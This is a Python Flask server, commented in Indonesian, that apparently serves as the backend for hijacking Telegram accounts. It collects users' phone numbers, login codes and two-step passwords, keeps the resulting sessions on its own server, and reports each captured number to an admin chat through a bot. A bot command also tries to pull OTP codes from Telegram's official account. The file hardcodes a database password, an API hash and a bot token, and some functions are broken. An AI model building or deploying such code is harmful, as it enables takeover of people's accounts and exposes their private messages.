from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.exc import IntegrityError
import asyncio

app = Flask(__name__)
CORS(app)

# Ganti dengan URL koneksi ElephantSQL Anda
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql+pg8000://xtswxymn:hcSaLOzAhkpmD3294h10blhyhhTeXAUU@manny.db.elephantsql.com/xtswxymn'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Model untuk menyimpan sesi pengguna
class UserSession(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    phone_number = db.Column(db.String(15), unique=True, nullable=False)
    telegram_id = db.Column(db.String(50), unique=True, nullable=False)
    is_logged_in = db.Column(db.Boolean, default=True)  # Menyimpan status login

# Ganti dengan API ID dan API Hash Anda
API_ID = '23351791'
API_HASH = '0020ea97b2e5d0a57bfce6b99f292791'
BOT_TOKEN = '7739744157:AAFYlYObu8O82BO2GYVnnunS2LTU1abO3ZA'  # Ganti dengan token bot Anda

# Variabel global untuk admin chat ID
ADMIN_CHAT_ID = '6124038392'  # Ganti dengan ID chat admin Anda

# Inisialisasi bot Telegram
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Buat database dan tabel jika belum ada
with app.app_context():
    db.create_all()

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    phone_number = data.get('phone_number')

    # Membuat nama sesi unik berdasarkan nomor telepon
    session_name = f'session_{phone_number.replace("+", "")}'  # Menghapus tanda '+' untuk nama file yang valid
    client = TelegramClient(session_name, API_ID, API_HASH)

    try:
        # Menghubungkan ke Telegram
        client.start(phone=phone_number)

        # Mengirim kode verifikasi ke nomor telepon
        client.send_code_request(phone_number)
        return jsonify({"message": "Kode verifikasi telah dikirim."}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500  # Mengembalikan kesalahan dalam format JSON


@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone_number = data.get('phone_number')
    verification_code = data.get('verification_code')

    # Membuat nama sesi unik berdasarkan nomor telepon
    session_name = f'session_{phone_number.replace("+", "")}'  # Menghapus tanda '+' untuk nama file yang valid
    client = TelegramClient(session_name, API_ID, API_HASH)

    # Menghubungkan ke Telegram
    client.start(phone=phone_number)

    try:
        # Memverifikasi kode
        user = client.sign_in(phone_number, verification_code)
        
        # Simpan sesi pengguna ke database
        new_session = UserSession(phone_number=phone_number, telegram_id=str(user.id))
        db.session.add(new_session)
        db.session.commit()

        # Kirim pesan ke bot dengan informasi nomor yang berhasil login
        asyncio.run(send_login_info_to_bot(phone_number))

        return jsonify({"message": "Login berhasil."}), 200
    except SessionPasswordNeededError:
        return jsonify({"message": "Verifikasi dua langkah diperlukan."}), 401
    except IntegrityError:
        db.session.rollback()
        return jsonify({"message": "Sesi pengguna sudah ada."}), 400
    except Exception as e:
        return jsonify({"message": "Kode verifikasi salah atau terjadi kesalahan: " + str(e)}), 400

async def send_login_info_to_bot(phone_number):
    await bot.send_message(ADMIN_CHAT_ID, f'Nomor yang berhasil login: {phone_number}')

@app.route('/api/logout', methods=['POST'])
def logout():
    data = request.json
    phone_number = data.get('phone_number')

    # Mencari sesi pengguna di database
    session = UserSession.query.filter_by(phone_number=phone_number).first()
    if session:
        # Menghapus sesi dari database
        db.session.delete(session)
        db.session.commit()

        # Kirim pesan ke admin bahwa pengguna telah logout
        asyncio.run(send_logout_info_to_bot(phone_number))
        return jsonify({"message": "Logout berhasil."}), 200
    else:
        return jsonify({"message": "Sesi tidak ditemukan."}), 404

async def send_logout_info_to_bot(phone_number):
    await bot.send_message(ADMIN_CHAT_ID, f'Nomor yang telah logout: {phone_number}')

@app.route('/api/verify_password', methods=['POST'])
def verify_password():
    data = request.json
    password = data.get('password')

    try:
        # Memverifikasi password untuk verifikasi dua langkah
        client.sign_in(password=password)
        return jsonify({"message": "Login berhasil."}), 200
    except Exception as e:
        return jsonify({"message": "Password salah: " + str(e)}), 400

@bot.on(events.NewMessage(pattern='/cekotp'))
async def handler(event):
    if event.is_private:  # Pastikan hanya admin yang bisa menggunakan perintah ini
        phone_number = event.raw_text.split(' ')[1]  # Ambil nomor telepon dari perintah
        await event.reply(f'Mengambil kode OTP untuk nomor: {phone_number}')
        # Logika untuk mengambil kode OTP dari Telegram resmi (777000)
        await bot.send_message('777000', f'Kirim kode OTP untuk nomor: {phone_number}')

if __name__ == '__main__':
    bot.start()
    app.run(debug=True)
